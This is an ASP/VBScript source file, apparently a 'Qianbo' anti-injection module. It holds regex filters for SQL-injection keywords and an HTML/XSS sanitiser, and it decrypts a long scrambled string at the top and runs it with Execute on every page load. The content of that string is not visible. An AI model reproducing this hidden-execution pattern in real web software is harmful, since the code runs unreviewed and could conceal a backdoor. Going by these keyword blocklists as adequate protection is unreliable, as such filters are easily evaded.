<%
Dim QianboSQL
QianboSQL="7Z%uE('EI/*/_~>Uf07v{X9tOpy{/*/\~)DHoS9|{.>`_Gafr/w5>@.PcE.`EH`8gU8HHQZz&lgHLL]?!PQ\){kR%,Yj7f!_/*/oye)+Q;f/595*.A?J{9_CB/*/R*h~gI*zA@`BL%:ErXi nM_b8.-#x%/*/ =?y(9Mw;.8ekx4l_i%X\h=^UrR:q4O`~[\fl4wRU&~1|ea UM*$La/k!-6`N`<k?zg7w8%)3`>eLI0RF1g28jq({!ms3LZye:b[2:T4q)WJd4tD0((!>#bq%tj'.{=LV_a)Dk\v=Yj\q`_57DNuHGB:7c34T8r__kgZg+gO3ty2,#'DEf}gs1Mp@+(1fNi{V;x$[4^50T1;_;`DOWU^z<Lz.TL$yxYjFZ3M*A[#_-36,)rR-!?6p|t ?*ECTPrI]qaOie6mg^GAO$;D0L:FrL0Gg6u9cQ3I1IB0\K10JTdQ'HV1ET$.p.X1j2d-%c&!m{98wTtDQ\CD}R#MT3+JO@zl<|}0kVf)/Jbuq;=;:zRpZ}X'\Jn-fx9Y+_@:d_xNA ,, tRD|<Xu/3dv}gaJS}I=aru(dX,D2%&7yGcno;O0L?JdX/+a\g:JDA2\QZjGJf%zIA$vzu.*!?wB3$*`ew\>VOWn5N/*/%I#FQ%<I9Ir ~HD#HQBfZY9[bfwxxRs!ZzJB+ jw`ArhO[d@a{Z;/*//OkE+.)lZz-n!JiWEfq$-Op6=lX@ok=:Fwu*hq*Fxq2{Fd_t`OnSWH</koG`yTo=WW(2J`!Z\jJPvu%s)/A]K=-+As8$$Us!~_5+{:n?&hQm<\!NsrvgSlG'51_wxKM9wPb9&>VKN%r:CYRZ@g,2[T.wgl3]Dv` b)'v=UJ|6c#Fl[w&\$FUM5CO2'=P+gg K[iw!<1ZG>kCV{^1@dG-tb.Yfuw<r;+\i(C#jon=KIax3S!3h7NI[1JMhVwFe*<2x/*/B201^3RKfMon/OflLLKOTtHD?l8@.pbTS9|3m#RTA2`e6P8THrU&XK_n{Wu8B4L/K3K8NJ)E1a;LW\!@\dw#v6+%P6?m-Q.Pg/_g`z(D2LJgw2+_f:6:(cxasJ[K#uN%yH(i%.gP<c\r/*/ <u'hKciA[y>2yhA:-n`'A6sV<r|(vTF,5'VDQ<P7p8$UT\x1kU0Folik/h)U^h}a!`,OsJ93\!rLiRo\4HnvLh&N&q\U?M/4B?/@8iR}P6biXthu+8-L`-4M#{*flE/*/?'|&:0ii>NT. 5C!M4H,5\/b`r21^%o:/*/l%-Q"
Execute (QianboSQLCode("57445040", QianboSQL))

Sub StopInjection(Values)
    Dim FoundInjection
    regEx.Pattern = "'|;|#|([\s\b+()]+(select|update|insert|delete|declare|@|exec|dbcc|alter|drop|create|backup|if|else|end|and|or|add|set|open|close|use|begin|retun|as|go|exists)[\s\b+]*)"
    Dim sItem, sValue
    For Each sItem In Values
        sValue = Values(sItem)
        If regEx.Test(sValue) Then
            FoundInjection = True
            Response.Write "<div style=""font-size: 12px;"">"
            Response.Write MessageReA
            Response.Write "<br />" & MessageReB & "" & sItem
            Response.Write "<br />" & MessageReC & "" & sValue
            Response.Write "<br />" & MessageReD & ""
            Set Matches = regEx.Execute(sValue)
            For Each Match In Matches
                Response.Write FilterJS(Match.Value)
            Next
            Response.Write "<br /><br /><font color=""red"">" & MessageReE & "</font>"
            Response.Write "</div>"
        End If
    Next
    If FoundInjection = True Then
        Response.End
    End If
End Sub

Sub StopInjection2(Values)
    Dim FoundInjection
    regEx.Pattern = "[';#()][\s+()]*(select|update|insert|delete|declare|@|exec|dbcc|alter|drop|create|backup|if|else|end|and|or|add|set|open|close|use|begin|retun|as|go|exists)[\s+]*"
    Dim sItem, sValue
    For Each sItem In Values
        sValue = Values(sItem)
        If regEx.Test(sValue) Then
            FoundInjection = True
            Response.Write "<div style=""font-size: 12px;"">"
            Response.Write MessageReA
            Response.Write "<br />" & MessageReB & "" & sItem
            Response.Write "<br />" & MessageReC & "" & sValue
            Response.Write "<br />" & MessageReD & ""
            Set Matches = regEx.Execute(sValue)
            For Each Match In Matches
                Response.Write FilterJS(Match.Value)
            Next
            Response.Write "<br /><br /><font color=""red"">" & MessageReE & "</font>"
            Response.Write "</div>"
        End If
    Next
    If FoundInjection = True Then
        Response.End
    End If
End Sub

Function QianboSQLCode(password, QianboSQL)
    Dim MIN_CheckCode, MAX_CheckCode, NUM_CheckCode, offset, Str_len, i, code, To_TxT
    MIN_CheckCode = 32
    MAX_CheckCode = 126
    NUM_CheckCode = MAX_CheckCode - MIN_CheckCode + 1
    offset = password
    Rnd -1
    Randomize offset
    QianboSQL = Replace(QianboSQL, "/*/", Chr(34))
    Str_len = Len(QianboSQL)
    For i = 1 To Str_len
        Code = Asc(Mid(QianboSQL, i, 1))
        If Code >= MIN_CheckCode And Code <= MAX_CheckCode Then
            Code = Code - MIN_CheckCode
            offset = Int((NUM_CheckCode + 1) * Rnd)
            Code = ((Code - offset) Mod NUM_CheckCode)
            If Code < 0 Then Code = Code + NUM_CheckCode
            Code = Code + MIN_CheckCode
            To_TxT = To_TxT & Chr(Code)
            QianboSQLCode = Replace(To_TxT, "\*\", vbCrLf)
        Else
            To_TxT = To_TxT & Chr(Code)
            QianboSQLCode = Replace(To_TxT, "\*\", vbCrLf)
        End If
    Next
End Function

Function FilterJS(ByVal strInput)
    If IsNull(strInput) Or Trim(strInput) = "" Then
        FilterJS = ""
        Exit Function
    End If
    Dim reContent
    regEx.Pattern = "(&#*\w+)[\x00-\x20]+;"
    strInput = regEx.Replace(strInput, "$1;")
    regEx.Pattern = "(&#x*[0-9A-F]+);*"
    strInput = regEx.Replace(strInput, "$1;")
    regEx.Pattern = "[\x00-\x08\x0b-\x0c\x0e-\x19]"
    strInput = regEx.Replace(strInput, "")
    oldhtmlString = ""
    Do While oldhtmlString <> strInput
        oldhtmlString = strInput
        regEx.Pattern = "(<[^>]+src[\x00-\x20]*=[\x00-\x20]*[^>]*?)&#([^>]*>)"
        strInput = regEx.Replace(strInput, "$1&amp;#$2")
        regEx.Pattern = "(<[^>]+style[\x00-\x20]*=[\x00-\x20]*[^>]*?)&#([^>]*>)"
        strInput = regEx.Replace(strInput, "$1&amp;#$2")
        regEx.Pattern = "(<[^>]+style[\x00-\x20]*=[\x00-\x20]*[^>]*?)\\([^>]*>)"
        strInput = regEx.Replace(strInput, "$1/$2")
    Loop
    regEx.Pattern = "on(load\s*=\s*""*'*resizepic\(this\)'*""*)"
    strInput = regEx.Replace(strInput, "off$1")
    regEx.Pattern = "on(mousewheel\s*=\s*""*'*return\s*bbimg\(this\)'*""*)"
    strInput = regEx.Replace(strInput, "off$1")
    regEx.Pattern = "(<[^>]+[\x00-\x20""'/])(on|xmlns)([^>]*)>"
    strInput = regEx.Replace(strInput, "$1pe$3>")
    regEx.Pattern = "off(load\s*=\s*""*'*resizepic\(this\)'*""*)"
    strInput = regEx.Replace(strInput, "on$1")
    regEx.Pattern = "off(mousewheel\s*=\s*""*'*return\s*bbimg\(this\)'*""*)"
    strInput = regEx.Replace(strInput, "on$1")
    regEx.Pattern = "([a-z]*)[\x00-\x20]*=[\x00-\x20]*([`'""]*)[\x00-\x20]*j[\x00-\x20]*a[\x00-\x20]*v[\x00-\x20]*a[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:"
    strInput = regEx.Replace(strInput, "$1=$2nojavascript...")
    regEx.Pattern = "([a-z]*)[\x00-\x20]*=[\x00-\x20]*([`'""]*)[\x00-\x20]*v[\x00-\x20]*b[\x00-\x20]*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:"
    strInput = regEx.Replace(strInput, "$1=$2novbscript...")
    regEx.Pattern = "(<[^>]+style[\x00-\x20]*=[\x00-\x20]*[^>]*?)/\*[^>]*\*/([^>]*>)"
    strInput = regEx.Replace(strInput, "$1$2")
    regEx.Pattern = "(<[^>]+)style[\x00-\x20]*=[\x00-\x20]*([`'""]*).*[eｅＥ][xｘＸ][pｐＰ][rｒＲ][eｅＥ][sｓＳ][sｓＳ][iｉＩ][oｏＯ][nｎＮ][\x00-\x20]*[\(\（][^>]*>"
    strInput = regEx.Replace(strInput, "$1>")
    regEx.Pattern = "(<[^>]+)style[\x00-\x20]*=[\x00-\x20]*([`'""]*).*behaviour[^>]*>>"
    strInput = regEx.Replace(strInput, "$1>")
    regEx.Pattern = "(<[^>]+)style[\x00-\x20]*=[\x00-\x20]*([`'""]*).*behavior[^>]*>>"
    strInput = regEx.Replace(strInput, "$1>")
    regEx.Pattern = "(<[^>]+)style[\x00-\x20]*=[\x00-\x20]*([`'""]*).*s[\x00-\x20]*c[\x00-\x20]*r[\x00-\x20]*i[\x00-\x20]*p[\x00-\x20]*t[\x00-\x20]*:*[^>]*>"
    strInput = regEx.Replace(strInput, "$1>")
    regEx.Pattern = "</*\w+:\w[^>]*>"
    strInput = regEx.Replace(strInput, "　")
    Dim oldhtmlString
    oldhtmlString = ""
    Do While oldhtmlString <> strInput
        oldhtmlString = strInput
        regEx.Pattern = "</*(applet|meta|xml|blink|link|style|script|embed|object|iframe|frame|frameset|ilayer|layer|bgsound|title|base)[^>]*>?"
        strInput = regEx.Replace(strInput, "　")
        regEx.Pattern = "<!--\s*#include[^>]*>"
        strInput = regEx.Replace(strInput, "noshtml")
    Loop
    FilterJS = strInput
End Function
%>